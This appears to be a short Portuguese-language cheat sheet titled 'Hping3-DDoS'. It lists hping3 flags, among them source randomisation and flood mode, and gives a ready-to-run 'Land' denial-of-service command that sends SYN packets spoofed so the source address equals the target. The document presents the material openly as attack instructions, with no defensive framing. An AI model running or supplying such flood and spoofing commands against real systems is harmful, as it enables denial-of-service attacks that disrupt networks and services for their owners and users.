# Hping3-DDoS

# Important Commands

```
• -V: Modo Verbose;
• -c: Contador de pacotes;
• -d: Tamanho do dado;
• -p: Porta de destino;
• -s: Porta de origem;
• –rand-source: Randomização da origem;
• –fast: 10 pacotes por segundo;
• –faster: 100 pacotes por segundo;
• –flood: Máximo de pacotes possı́veis por segundo;
```


## Atack DoS Land
```
hping3 -V -c 1000 -d 100 -S -p 21 -s 80
-k -a 192.168.1.110 192.168.1.110
```